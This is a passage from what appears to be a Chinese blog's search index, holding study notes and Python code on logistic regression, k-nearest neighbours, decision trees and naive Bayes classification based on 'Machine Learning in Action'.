logRegres.py，改进后的代码中，alpha每次迭代都会调整，这可以缓解高频波动，并且虽然alpha随着迭代次数减小，但永远不会减小到0（常数项存在），这样保证多次迭代之后新数据仍然对系数有影响。同样，这也避免了alpha的严格下降，避免参数的严格下降也常见于模拟退火算法等其他优化算法中。改进后的代码通过随机选取样本的方式更新回归系数，这样可以减少周期性波动。改进后的代码收敛速度更快，默认迭代次数150。 12345678910111213def stocGradAscent1(dataMatrix, classLabels, numIter = 150): m, n = shape(dataMatrix) weights = ones(n) for j in range(numIter): dataIndex = range(m) for i in range(m): alpha = 4/(1.0+j+i)+0.0001 randIndex = int(random.uniform(0, len(dataIndex))) h = sigmoid(sum(dataMatrix[randIndex]*weights)) error = classLabels[randIndex] - h weights = weights + alpha * error * dataMatrix[randIndex] del(dataIndex[randIndex]) return weights 改进后的回归系数 处理数据中的缺失值 假设有1000个样本和20个特征，若某传感器损坏导致一个特征无效，其余数据仍可用。 使用可用特征的均值填补缺失值 使用特殊值来填补确实值，如-1 忽略有缺失值的样本 使用相似样本的均值填补缺失值 使用另外的机器学习算法预测缺失值 对于Logistic回归，确实只用0代替可以保留现有数据，并且无需对算法进行修改。如果在测试数据集中发现某一条数据的类别标签已经缺失，Logistic回归的简单做法是将该数据丢弃，但如果采用类似kNN的方法则不太可行。 Code 用logistic回归从疝气病症预测病马死亡率 - logRegres.py 1234567891011121314151617181920212223242526272829303132333435def classifyVector(inX, weights): prob = sigmoid(sum(inX*weights)) if prob &gt; 0.5 : return 1.0 else: return 0.0def colicTest(): frTrain = open('horseColicTraining.txt') frTest = open('horseColicTest.txt') trainingSet = []; trainingLabels = [] for line in frTrain.readlines(): currLine = line.strip().split('\\t') lineArr = [] for i in range(21): lineArr.append(float(currLine[i])) trainingSet.append(lineArr) trainingLabels.append(float(currLine[21])) trainWeights = stocGradAscent1(array(trainingSet), trainingLabels, 1000) errorCount = 0; numTestVec = 0.0 for line in frTest.readlines(): numTestVec += 1.0 currLine = line.strip().split('\\t') lineArr = [] for i in range(21): lineArr.append(float(currLine[i])) if int(classifyVector(array(lineArr), trainWeights)) != int(currLine[21]) : errorCount += 1 errorRate = (float(errorCount)/numTestVec) print \"the error rate of this test is %f\" % errorRate return errorRatedef multiTest(): numTests = 10; errorSum = 0.0 for k in range(numTests): errorSum += colicTest() print \"after %d iterations the average error rate is: %f\" % (numTests, errorSum/float(numTests)) Matplotlib绘制 备份下列几份代码（来自《机器学习实战》的github），大致了解matplotlib绘制的基本方法。 绘制等高线 - plotGD.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import matplotlibimport numpy as npimport matplotlib.cm as cmimport matplotlib.mlab as mlabimport matplotlib.pyplot as pltleafNode = dict(boxstyle=\"round4\", fc=\"0.8\")arrow_args = dict(arrowstyle=\"&lt;-\")matplotlib.rcParams['xtick.direction'] = 'out'matplotlib.rcParams['ytick.direction'] = 'out'delta = 0.025x = np.arange(-2.0, 2.0, delta)y = np.arange(-2.0, 2.0, delta)X, Y = np.meshgrid(x, y)Z1 = -((X-1)**2)Z2 = -(Y**2)#Z1 = mlab.bivariate_normal(X, Y, 1.0, 1.0, 0.0, 0.0)#Z2 = mlab.bivariate_normal(X, Y, 1.5, 0.5, 1, 1)# difference of GaussiansZ = 1.0 * (Z2 + Z1)+5.0# Create a simple contour plot with labels using default colors. The# inline argument to clabel will control whether the labels are draw# over the line segments of the contour, removing the lines beneath# the labelplt.figure()CS = plt.contour(X, Y, Z)plt.annotate('', xy=(0.05, 0.05), xycoords='axes fraction', xytext=(0.2,0.2), textcoords='axes fraction', va=\"center\", ha=\"center\", bbox=leafNode, arrowprops=arrow_args )plt.text(-1.9, -1.8, 'P0')plt.annotate('', xy=(0.2,0.2), xycoords='axes fraction', xytext=(0.35,0.3), textcoords='axes fraction', va=\"center\", ha=\"center\", bbox=leafNode, arrowprops=arrow_args )plt.text(-1.35, -1.23, 'P1')plt.annotate('', xy=(0.35,0.3), xycoords='axes fraction', xytext=(0.45,0.35), textcoords='axes fraction', va=\"center\", ha=\"center\", bbox=leafNode, arrowprops=arrow_args )plt.text(-0.7, -0.8, 'P2')plt.text(-0.3, -0.6, 'P3')plt.clabel(CS, inline=1, fontsize=10)plt.title('Gradient Ascent')plt.xlabel('x')plt.ylabel('y')plt.show() 生成图像如下 随机梯度上升过程中回归系数的变化 - plotGD.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from numpy import *import matplotlibimport matplotlib.pyplot as pltfrom matplotlib.patches import Rectangleimport logRegresdef stocGradAscent0(dataMatrix, classLabels): m,n = shape(dataMatrix) alpha = 0.5 weights = ones(n) #initialize to all ones weightsHistory=zeros((500*m,n)) for j in range(500): for i in range(m): h = logRegres.sigmoid(sum(dataMatrix[i]*weights)) error = classLabels[i] - h weights = weights + alpha * error * dataMatrix[i] weightsHistory[j*m + i,:] = weights return weightsHistorydef stocGradAscent1(dataMatrix, classLabels): m,n = shape(dataMatrix) alpha = 0.4 weights = ones(n) #initialize to all ones weightsHistory=zeros((40*m,n)) for j in range(40): dataIndex = range(m) for i in range(m): alpha = 4/(1.0+j+i)+0.01 randIndex = int(random.uniform(0,len(dataIndex))) h = logRegres.sigmoid(sum(dataMatrix[randIndex]*weights)) error = classLabels[randIndex] - h #print error weights = weights + alpha * error * dataMatrix[randIndex] weightsHistory[j*m + i,:] = weights del(dataIndex[randIndex]) print weights return weightsHistory dataMat,labelMat=logRegres.loadDataSet()dataArr = array(dataMat)myHist = stocGradAscent1(dataArr,labelMat)n = shape(dataArr)[0] #number of points to createxcord1 = []; ycord1 = []xcord2 = []; ycord2 = []markers =[]colors =[]fig = plt.figure()ax = fig.add_subplot(311) # take caretype1 = ax.plot(myHist[:,0])plt.ylabel('X0')ax = fig.add_subplot(312)type1 = ax.plot(myHist[:,1])plt.ylabel('X1')ax = fig.add_subplot(313)type1 = ax.plot(myHist[:,2])plt.xlabel('iteration')plt.ylabel('X2')plt.show() 生成图像如下 生成sigmoid函数 - sigmoidPlot.py 12345678910111213141516import sysfrom pylab import *t = arange(-60.0, 60.3, 0.1)s = 1/(1 + exp(-t))ax = subplot(211)ax.plot(t,s)#ax.axis([-5,5,0,1])plt.xlabel('x')plt.ylabel('Sigmoid(x)')ax = subplot(212) # x-y-indexax.plot(t,s)ax.axis([-60,60,0,1]) # x-index widthplt.xlabel('x')plt.ylabel('Sigmoid(x)')show() 生成图像如下 Logistic回归总结 Logistic回归的目的是寻找一个非线性函数Sigmoid的最佳拟合参数，求解过程可以由最优化算法完成。随机梯度上升算法可以简化梯度上升算法，获取几乎相同的效果，并且占用更少的计算资源，在新数据到来时完成在线更新，而不需要重新读取整个数据集。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/09/machinelearning5/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 01-04）","slug":"machinelearning1-4","date":"2016-02-04T15:48:05.000Z","updated":"2017-08-22T07:29:58.000Z","comments":true,"path":"2016/02/04/machinelearning1-4/","link":"","permalink":"http://forec.github.io/2016/02/04/machinelearning1-4/","excerpt":"最近在自学数据挖掘和机器学习方面的内容，参考《机器学习实战 - 美Peter Harrington》。整理笔记备忘，所有代码除小部分改动和增加外，都来自附书源码。下面为Chapter1~Chapter4内容。","text":"最近在自学数据挖掘和机器学习方面的内容，参考《机器学习实战 - 美Peter Harrington》。整理笔记备忘，所有代码除小部分改动和增加外，都来自附书源码。下面为Chapter1~Chapter4内容。 Chapter 01 使用NumPy 12345&gt;&gt;&gt; from numpy import *&gt;&gt;&gt; random.rand(4,4) # make 4*4 random array&gt;&gt;&gt; mat1 = mat( random.rand(4,4) ) # make 4*4 random matrix&gt;&gt;&gt; mat1.I # get the reverse of mat1&gt;&gt;&gt; eye(4) # make 4*4 unit matrix deb源安装numpy和matplotlib：pip install numpy，在此前需要安装python-dev。安装matplotlib前需要libpng，在sourceforge可以找到最新版本，之后apt-get install python-matplotlib。python3和python2类似。 标称型和数值型：分别从有限和无限目标集中取值。 选择合适算法 预测目标变量的值：监督学习算法 =&gt; 目标变量为离散型：分类算法； 目标变量为连续型：回归算法。 不预测目标变量：无监督学习算法 =&gt; 唯一需求是将数据划分为离散的组：聚类算法； 需要估计数据与每个组的相似度：密度估计算法。 开发机器学习程序步骤：收集数据-&gt;准备输入数据-&gt;分析输入数据-&gt;训练算法-&gt;测试算法。 Chapter 02 - k-近邻算法 已知样本集中每一数据与所属分类的对应关系，将待定数据的每个特征与样本集中数据对应的特征进行比较，取前k个最相似数据决断。 kNN - Category 流程 计算已知类别数据集中的点和当前点之间的距离（map） 按距离递增排序（sort） 选取于当前点距离最小的k个点（take） 统计k个点所在类别的出现频率（sortBy frequency） 返回前k个点中出现频率最高的类别（length . group） Haskell的表示： reverse . sort . map length . group . sortBy frequency . take k . sort . map distance Code - kNN.py 12345678910111213141516171819202122232425262728293031323334from numpy import *import operatordef createDataSet(): group = array([[1.0,1.1],[1.0,1.0],[0,0],[0,0.1]]) labels = ['A','A','B','B'] return group, labelsdef classify0(inX, dataSet, labels, k ): dataSetSize = dataSet.shape[0] # dataSet = group, dataSet.shape[0] = 4, dataSet.shape[1] = 2 diffMat = tile(inX, (dataSetSize, 1)) -dataSet # inX = [1,2] tile(inX,(4,2)) = array([[1,2,1,2], tile(inX,(2,3)) = array([[1,2,1,2,1,2], # [1,2,1,2], [1,2,1,2,1,2]]) # [1,2,1,2], # [1,2,1,2]]) sqDiffMat = diffMat**2 # diffMat = array([[ 0. , 0.1], diffMat**2 = array([[0, 0.01], # [ 0. , 0. ], [0, 0. ], # [ 1. , 1. ], [1.,1. ], # [ 1. , 0.9]]) [1.,0.81]]) sqDistances = sqDiffMat.sum(axis=1) # sqDiffMat.sum(axis=1) = array([ 0.01, 0. , 2. , 1.81]) distances = sqDistances**0.5 sortedDistIndicies = distances.argsort() # sortedDisIndicies = array([1, 0, 3, 2]), the indeices of the sorted distances classCount = &#123;&#125; for i in range(k) : voteIlabel = labels[sortedDistIndicies[i]] # get the first k data's label =&gt; k=3, ['A','A','B'] classCount[voteIlabel] = classCount.get(voteIlabel,0) + 1 # classCount.get(voteIlabel,default) if voteIlabel doesn't exist, return default sortedClassCount = sorted(classCount.iteritems(), key = operator.itemgetter(1), reverse =True) # sortedClassCount = [('A',2),('B',1)] return sortedClassCount[0][0] 约会网站配对效果 流程：收集数据（文本文件）-&gt;准备数据（用Python解析文本文件）-&gt;分析数据（用Matplotlib画二维扩散图）-&gt;训练算法（不适用k-近邻算法）-&gt;测试算法（使用提供的部分数据作为测试样本）-&gt;使用算法（产生命令行程序） 准备数据 - 文件-&gt;样本矩阵 数据存放在文本文件datingTestSet.txt中，每行为一个样本，共1000行，每行包含三种特征。在kNN.py中创建file2matrix将输入文本文件转为样本矩阵和类标签向量。 Code - kNN.py 123456789101112131415def file2matrix(filename): fr = open(filename) arrayOLines = fr.readlines() numberOfLines = len(arrayOLines) returnMat = zeros((numberOfLines, 3)) # generate a matrix filled with zero classLabelVector = [] index = 0 for line in arrayOLines: line = line.strip() listFromLine = line.split('\\t') returnMat[index,:] = listFromLine[0:3] classLabelVector.append(int(listFromLine[-1])) index += 1 return returnMat, classLabelVector 分析数据 - Matplotlib 作用在于从已有的样本中观察数据分布的特点，选择合适的坐标，区分数据点从属的类别。 交互命令 12345678&gt;&gt;&gt; import kNN&gt;&gt;&gt; datingDataMat, datingLabels = kNN.file2matrix('datingTestSet.txt')&gt;&gt;&gt; import matplotlib&gt;&gt;&gt; import matplotlib.pyplot as plt&gt;&gt;&gt; fig = plt.figure()&gt;&gt;&gt; ax = fig.add_subplot(111)&gt;&gt;&gt; ax.scatter(datingDataMat[:,1],datingDataMat[:,2])&gt;&gt;&gt; plt.show() 增加区分，修改上面的ax.scatter为ax.scatter(datingDataMat[:,1],datingDataMat[:,2],15.0*array(datingLabels),15.0*array(datingLabels))，需要从numpy库中导入array数组。此时绘制的图形采用数据中的第2列和第3列作为横纵坐标，区分出三种类型但不够清晰。若采用第1列和第2列作为坐标，得到散点图如下。 准备数据 - 归一化 简单通过欧几里得距离衡量样本与数据间距离会受到数据大小范围影响，例如每年飞行常客里程数的差距远大于视频游戏百分比。因此将所有数据的特征值都归一到0~1之间或-1~1之间，公式为newValue = (old - value - min) / ( max - min)。 Code - 归一化特征值 - kNN.py 123456789def autoNorm(dataSet): minVals = dataSet.min(0) maxVals = dataSet.max(0) ranges = maxVals - minVals normDataSet = zeros(shape(dataSet)) m = dataSet.shape[0] normDataSet = dataSet - tile(minVals, (m,1)) normDataSet = normDataSet / tile(ranges,(m,1)) return normDataSet, ranges, minvals 测试算法 取样本中一部分作为测试数据 Code - 测试算法 - kNN.py 1234567891011121314def datingClassTest(): hoRatio = 0.10 datingDataMat, datingLabels = file2matrix('datingTestSet.txt') normMat, ranges, minVals = autoNorm(datingDataMat) m = normMat.shape[0] numTestVecs = int(m*hoRatio) errorCount = 0.0 for i in range(numTestVecs): classifierResult = classify0(normMat[i,:], normMat[numTestVecs:m,:], datingLabels[numTestVecs:m], 3) print \"the classifier came back with: %d, the real answer is: %d\"\\ % (classifierResult, datingLabels[i]) if (classifierResult != datingLabels[i]): errorCount += 1.0 print \"the total error rate is :%f\" % (errorCount / float(numTestVecs)) 手写识别系统步骤 收集数据：提供32*32像素格式的txt文件 准备数据：编写函数img2vector()将文本文件转换为样本矩阵 分析数据：在命令提示符中检验数据正确性 训练算法：不适用于k-近邻算法 测试算法：使用部分数据集作为测试样本 准备数据 使用trainingDigits中的大约2000个例子作为样本，平均每个0~9的数字有200个样本。使用testDigits目录下的测试数据作为测试。 Code - img2vector - kNN.py 12345678def img2vector(filename): returnVect = zeros((1,1024)) fr = open(filename) for i in range (32): lineStr = fr.readline() for j in range (32): returnVect[0,32*i+j] = int(lineStr[j]) return returnVect 测试算法 测试946个文件，错误11个，修改变量k的值、随即训练样本的取样、训练样本的数目，都会对错误率产生影响。 Code - handwritingClassTest - kNN.py 1234567891011121314151617181920212223242526def handwritingClassTest(): from os import listdir hwLabels = [] trainingFileList = listdir('digits/trainingDigits') m = len(trainingFileList) trainingMat = zeros((m,1024)) for i in range(m): fileNameStr = trainingFileList[i] fileStr = fileNameStr.split('.')[0] classNumStr = int(fileStr.split('_')[0]) hwLabels.append(classNumStr) trainingMat[i,:] = img2vector('digits/trainingDigits/%s' % fileNameStr) testFileList= listdir('digits/testDigits') errorCount = 0.0 mTest = len(testFileList) for i in range(mTest): fileNameStr = testFileList[i] fileStr = fileNameStr.split('.')[0] classNumStr = int(fileStr.split('_')[0]) vectorUnderTest = img2vector('digits/testDigits/%s' % fileNameStr) classifierResult = classify0(vectorUnderTest, trainingMat, hwLabels, 3) print \"the classifier came back with: %d, the real answer is %d\"\\ % (classifierResult, classNumStr) if (classifierResult != classNumStr) : errorCount += 1.0 print \"\\nthe total number of errors is: %d\" % errorCount print \"\\nthe total error rate is: %f\" % (errorCount/float(mTest)) k-近邻算法 总结 k-近邻算法是基于实例的学习，使用算法是必须有接近实际数据的训练样本数据，并且必须保存全部数据集，使用大量的存储空间。需要对数据集中的每个数据计算距离值，实际使用过程非常耗时。并且k-近邻算法无法给出任何数据的基础结构信息，因而我们无法知晓平均实例样本和典型实例样本具有什么样的特征。k-决策树是k-近邻算法的优化，减少存储空间和计算时间开销。 Chapter 03 - 决策树 - 熵度量 k-近邻算法无法持久化分类器，每次分类都需要重新学习，并且无法给出数据的内在含义。决策树的主要优势在于其数据形式非常容易理解，并且可以保存在硬盘上。 特性和思想 决策树优点：计算复杂度不高，输出结果易于理解，对中间值的缺失不敏感，可以处理不相关的特征数据。缺点：可能产生过度匹配问题。适用于数值型和标称型，数值型需先离散化。 整体思路：大原则是“将无序的数据变得更加有序”。从当前可供学习的数据集中，选择一个特性，根据这个特性划分出来的数据分类，可以获得最高的信息增益（在划分数据集前后信息发生的变化），也可以说是最小的熵（公式l(xi) = p(xi)log(p(xi))，出现的概率越小，携带的信息量越大，熵越高，混合的数据也就越多），信息增益是熵的减少，或者是数据无序度的减少。在此划分之后，对划分出的各个分类再次进行算法，直到所有分类中均为同一类元素，或所有特性均已使用。 Code - trees.py - 计算香农熵 12345678910111213def calcShannonEnt(dataSet): # Calculate the shannonEnt numEntries = len(dataSet) labelCounts = &#123;&#125; for featVec in dataSet: currentLabel = featVec[-1] if currentLabel not in labelCounts.keys(): labelCounts[currentLabel] = 0 labelCounts[currentLabel] += 1 shannonEnt = 0.0 for key in labelCounts: prob = float(labelCounts[key])/numEntries shannonEnt -= prob * log(prob,2) # p(x)logp(x) return shannonEnt Code - trees.py - 按给定特征划分数据集 12345678def splitDataSet(dataSet, axis, value): retDataSet = [] for featVec in dataSet: if featVec[axis] == value: reducedFeatVec = featVec[:axis] reducedFeatVec.extend(featVec[axis+1:]) retDataSet.append(reducedFeatVec) return retDataSet Code - trees.py - 选择最优数据集划分特性 123456789101112131415161718def chooseBestFeatureToSplit(dataSet): numFeatures = len(dataSet[0]) - 1 baseEntropy = calcShannonEnt(dataSet) bestInfoGain = 0.0 ; bestFeature = -1 for i in range(numFeatures): featList = [example[i] for example in dataSet] uniqueVals = set(featList) newEntropy = 0.0 for value in uniqueVals: subDataSet = splitDataSet(dataSet, i ,value) prob = len(subDataSet)/float(len(dataSet)) newEntropy += prob * calcShannonEnt(subDataSet) # careful, newEntropy &lt; 0 infoGain = baseEntropy - newEntropy if infoGain &gt; bestInfoGain: bestInfoGain = infoGain bestFeature = i return bestFeature Code - trees.py - 选择该分类的代表种类 123456789def majorityCnt(classList): classCount = &#123;&#125; for vote in classList: if vote not in classCount.keys() : classCount[vote] = 0 classCount[vote] += 1 sortedClassCount = sorted(classCount.iteritems(),\\ key = operator.itemgetter(1), reverse = True) return sortedClassCount[0][0] Code - trees.py - 递归构建决策树 1234567891011121314151617def createTree(dataSet, labels): classList = [example[-1] for example in dataSet] if classList.count(classList[0]) == len(classList): return classList[0] if len(dataSet[0]) == 1: # all the features have been used return majorityCnt(classList) bestFeat = chooseBestFeatureToSplit(dataSet) bestFeatLabel = labels[bestFeat] myTree = &#123;bestFeatLabel:&#123;&#125;&#125; del(labels[bestFeat]) featValues = [example[bestFeat] for example in dataSet] uniqueVals = set(featValues) for value in uniqueVals: subLabels = labels[:] # deep copy myTree[bestFeatLabel][value] = createTree(splitDataSet\\ (dataSet, bestFeat, value), subLabels) return myTree Matplotlib绘制树形图 绘制代码在treePlotter.py 使用决策树分类 使用构造好的决策树对输入样例进行分类。已建立好的决策树可以使用pickle保存在本地。 Code - trees.py - 分类函数 1234567891011def classify(inputTree, featLabels, testVec): firstStr = inputTree.keys()[0] secondDict = inputTree[firstStr] featIndex = featLabels.index(firstStr) for key in secondDict.keys(): if testVec[featIndex] == key: if type(secondDict[key]).__name__ == 'dict': classLabel = classify(secondDict[key], featLabels, testVec) else: classLabel = secondDict[key] return classLabel Code - trees.py - 保存和读取决策树 123456789def storeTree(inputTree, filename): import pickle with open(filename,'w') as fw: pickle.dump(inputTree, fw)def grabTree(filename): import pickle fr = open(filename) return pickle.load(fr) Shell - 构建隐形眼镜决策树 12345&gt;&gt;&gt; fr = open('lenses.txt')&gt;&gt;&gt; lenses = [inst.strip().split('\\t') for inst in fr.readlines()]&gt;&gt;&gt; lensesLabels = ['age','prescript','astigmatic','tearRate']&gt;&gt;&gt; lensesTree = trees.createTree(lenses, lensesLabels)&gt;&gt;&gt; treePlotter.createPlot(lensesTree) 得到的决策树如下 ID3决策树总结 上述为ID3算法构造，通过熵度量信息增益。另一个度量集合无序程度的方法是基尼不纯度，从一个数据集中随机选取子项，度量其被错误分到其他分组里的概率。然而ID3构造出的决策树可能产生过度匹配问题，即叶子结点产生的匹配过多。可以通过裁剪决策树，合并相邻的无法产生大量信息增益的叶节点消除该问题。其他算法如C4.5和CART。k-近邻算法和ID3决策树都是结果确定的分类算法，数据实例最终会被明确划分到某个分类中。 Chapter 04 - 朴素贝叶斯 基于贝叶斯决策理论的分类，在数据较少的情况下依然有效，可以处理多类别问题，但对于输入数据的准备方式较为敏感。适用数据类型为标称型数据。对于待测数据X，Pi(x)表示X属于类别i的概率，取最高者作为最终类别。 条件概率和朴素贝叶斯决策 条件概率：在事件x的前提下发生事件c的概率为P(c|x)，其计算公式为P(c|x) = P(x|c)P(c)/P(x)。 朴素贝叶斯分类器的两个假设：朴素即独立，指一个特征或者单词出现的可能性与其他特征没有关系；每个特征同等重要。 朴素贝叶斯的一般过程 收集数据 准备数据：标称型或布尔型数据 分析数据：有大量特征时可使用直方图 训练算法：计算不同的独立特征的条件概率 测试算法：计算错误率 使用算法 使用朴素贝叶斯进行文档分类：使用文档中的每个词作为特征并观察它们是否出现，假设每个特征需要N个样本，有M个特征就需要N^M个样本，若特征之间相互独立，则所需要的样本数为M*N个。对于一篇文章，计算出其对应的数据向量，计算这个向量所属各个类别的概率，并取最高者。 Python - 文本分类 以在线社区的留言板为例，屏蔽侮辱性的言论。通过统计文档中出现各个单词的数量，进行频率分析并确定待测留言是否属于侮辱性言论。 Code - 从文本构建词向量 - bayes.py 12345678910111213141516171819202122232425262728def loadDataSet(): postingList = [['my', 'dog', 'has', 'flea', \\ 'problems', 'help', 'please'], ['maybe', 'not', 'take', 'him', \\ 'to', 'dog', 'park', 'stupid'], ['my', 'dalmation', 'is', 'so', 'cute', \\ 'I', 'love', 'him'], ['stop', 'posting', 'stupid', 'worthless', 'garbage'], ['mr', 'licks', 'ate', 'my', 'steak', 'how', \\ 'to', 'stop', 'him'], ['quit', 'buying', 'worthless', 'dog', 'food', 'stupid']] classVec = [0, 1, 0, 1, 0, 1] return postingList, classVec def createVocabList(dataSet): vocabSet = set([]) for document in dataSet: vocabSet = vocabSet | set(document) return list(vocabSet) def setOfWords2Vec(vocabList, inputSet): # 贝努利模型 returnVec = [0] * len(vocabList) for word in inputSet: if word in vocabList: returnVec[vocabList.index(word)] = 1 else: print \"the word: %s i snot in my Vocabulary!\" % word return returnVec Code - 从词向量计算概率 - bayes.py 12345678910111213141516def trainNB0(trainMatrix, trainCategory): numTrainDocs = len(trainMatrix) numWords = len(trainMatrix[0]) pAbusive = sum(trainCategory)/float(numTrainDocs) p0Num = ones(numWords); p1Num = ones(numWords) p0Denom = 2.0; p1Denom = 2.0 # 初始化概率 for i in range(numTrainDocs): if trainCategory[i] == 1: p1Num += trainMatrix[i] p1Denom += sum(trainMatrix[i]) else: p0Num += trainMatrix[i] p0Denom += sum(trainMatrix[i]) p1Vect = log(p1Num / p1Denom) # 取对数避免出现0 p0Vect = log(p0Num / p0Denom) return p0Vect, p1Vect, pAbusive Code - 计算最大概率 - bayes.py 1234567def classifyNB(vec2Classify, p0Vec, p1Vec, pClass1): p1 = sum(vec2Classify * p1Vec) + log(pClass1) p0 = sum(vec2Classify * p0Vec) + log(1.0 - pClass1) if p1 &gt; p0: return 1 else: return 0 Code - 测试分类函数 - bayes.py 12345678910111213def testingNB(): listOPosts, listClasses = loadDataSet() myVocabList = createVocabList(listOPosts) trainMat = [] for postinDoc in listOPosts: trainMat.append(setOfWords2Vec(myVocabList, postinDoc)) p0V, p1V, pAb = trainNB0(array(trainMat),array(listClasses)) testEntry = ['love', 'my', 'dalmation'] thisDoc = array(setOfWords2Vec(myVocabList, testEntry)) print testEntry, 'classified as: ', classifyNB(thisDoc, p0V, p1V, pAb) testEntry = ['stupid', 'garbage'] thisDoc = array(setOfWords2Vec(myVocabList, testEntry)) print testEntry, 'classified as: ', classifyNB(thisDoc, p0V, p1V, pAb) 文档词袋模型：在词集中，每个词出现一次和出现多次是等同的，在词袋模型中，单词出现次数对概率有影响。 123456def bagOfWords2VecMN(vocabList, inputSet): # 多项式模型 returnVec = [0] * len(vocabList) for word in inputSet: if word in vocabList: returnVec[vocabList.index(word)] += 1 return returnVec 过滤垃圾邮件 切分文本，并使用朴素贝叶斯交叉验证。将训练集中随机选择的文件从训练集中剔除，作为测试集，称为“留存交叉验证”。 Code - 文件解析 - bayes.py 1234def textParse(bigString): import re listOfTokens = re.split(r'\\W*', bigString) return [tok.lower() for tok in listOfTokens if len(tok) &gt; 2] Code - 垃圾邮件测试 - bayes.py 12345678910111213141516171819202122232425262728def spamTest(): docList = []; classList = []; fullText = []; for i in range(1,26): wordList = textParse(open('email/spam/%d.txt' % i).read()) docList.append(wordList) fullText.extend(wordList) classList.append(1) wordList = textParse(open('email/ham/%d.txt' %i).read()) docList.append(wordList) fullText.extend(wordList) classList.append(0) vocabList = createVocabList(docList) trainingSet = range(50); testSet = [] for i in range(10): randIndex = int(random.uniform(0, len(trainingSet))) # 修改trainingSet,长度随之修改 testSet.append(trainingSet[randIndex]) del(trainingSet[randIndex]) trainMat = []; trainClasses = [] for docIndex in trainingSet: trainMat.append(setOfWords2Vec(vocabList, docList[docIndex])) trainClasses.append(classList[docIndex]) p0V, p1V, pSpam = trainNB0(array(trainMat),array(trainClasses)) errorCount = 0 for docIndex in testSet: wordVector = setOfWords2Vec(vocabList, docList[docIndex]) if classifyNB(array(wordVector), p0V, p1V, pSpam) != classList[docIndex]: errorCount += 1 print 'the error rate is: ', float(errorCount)/len(testSet) 从RSS个人广告中获取区域倾向 安装feedparser，从RSS源收集内容。从美国两个城市中选取一些人，通过分析这些人发布的征婚广告信息，比较两个城市的人在广告用词上是否不同。 Code - RSS源分类器 - 高频词分类去除 - bayes.py 1234567891011121314151617181920212223242526272829303132333435363738394041def calcMostFreq(vocabList, fullText): # 计算出现频率 import operator freqDict = &#123;&#125; for token in vocabList: freqDict[token] = fullText.count(token) sortedFreq = sorted(freqDict.iteritems(), key = operator.itemgetter(1), reverse = True) return sortedFreq[:30]def localWords(feed): import feedparser feedLen = len(feed) docList = []; classList = []; fullText = [] minLen = min([len(feedElem['entries']) for feedElem in feed]) for i in range(minLen): for j in range(feedLen): wordList = textParse(feed[j]['entries'][i]['summary']) docList.append(wordList) fullText.extend(wordList) classList.append(j) vocabList = createVocabList(docList) top30Words = calcMostFreq(vocabList, fullText) # print top30Words # for pairW in top30Words: # if pairW[0] in vocabList: vocabList.remove(pairW[0]) # 移除高频词 trainingSet = range(2*minLen); testSet = [] for i in range(10): randIndex = int(random.uniform(0, len(trainingSet))) testSet.append(trainingSet[randIndex]) del(trainingSet[randIndex]) trainMat = []; trainClasses = [] for docIndex in trainingSet: trainMat.append(bagOfWords2VecMN(vocabList, docList[docIndex])) trainClasses.append(classList[docIndex]) p0V, p1V, pSpam = trainNB0(array(trainMat), array(trainClasses)) errorCount = 0 for docIndex in testSet: wordVector = bagOfWords2VecMN(vocabList, docList[docIndex]) if classifyNB(array(wordVector), p0V, p1V, pSpam) != classList[docIndex]: errorCount += 1 print 'the error rate is: ', float(errorCount)/len(testSet) return vocabList, p0V, p1V 注释掉移除高频词的三行代码后，错误率为54%，保留这些代码错误率为70%。留言中出现次数最多的三十个词涵盖了所有用词的30%。通过下面的代码测试错误率。 1234567&gt;&gt;&gt; import bayes&gt;&gt;&gt; ny = feedparser.parse('http://newyork.craigslist.org/stp/index.rss')&gt;&gt;&gt; sf = feedparser.parse('http://sfbay.craigslist.org/stp/index.rss')&gt;&gt;&gt; vocabList, pSF, pNY = bayes.localWords(ny, sf)the error rate is 0.1&gt;&gt;&gt; vocabList, pSF, pNY = bayes.localWords(ny, sf)the error rate is 0.35 Code - 显示地域相关用词 - bayes.py 123456789101112131415def getTopWords(ny,sf): import operator vocabList, p0V, p1V = localWords([ny,sf]) topNY = []; topSF = [] for i in range(len(p0V)): if p0V[i] &gt; -4.0 : topSF.append((vocabList[i],p0V[i])) if p1V[i] &gt; -4.0 : topNY.append((vocabList[i],p1V[i])) sortedSF = sorted(topSF, key = lambda pair : pair[1], reverse = True) print \"SF**SF**SF**SF**SF\" for item in sortedSF: print item[0] sortedNY = sorted(topNY, key = lambda pair : pair[1], reverse = True) print \"NY**NY**NY**NY**NY\" for item in sortedNY: print item[0] 朴素贝叶斯总结 贝叶斯概率和准则提供了一种利用已知值来估计未知概率的有效方法。可以通过特征之间的条件独立性假设，降低对数据量的需求。下溢出问题可以通过对概率求对数解决，词袋模型在解决文档分类问题比词集模型有所提高。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/04/machinelearning1-4/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"C语言的一种错误传参做法","slug":"parameter-error","date":"2015-12-28T01:36:09.000Z","updated":"2016-11-04T16:08:48.000Z","comments":true,"path":"2015/12/28/parameter-error/","link":"","permalink":"http://forec.github.io/2015/12/28/parameter-error/","excerpt":"多次遇过的一个错误传参做法。","text":"多次遇过的一个错误传参做法。 C/C++中的堆和栈 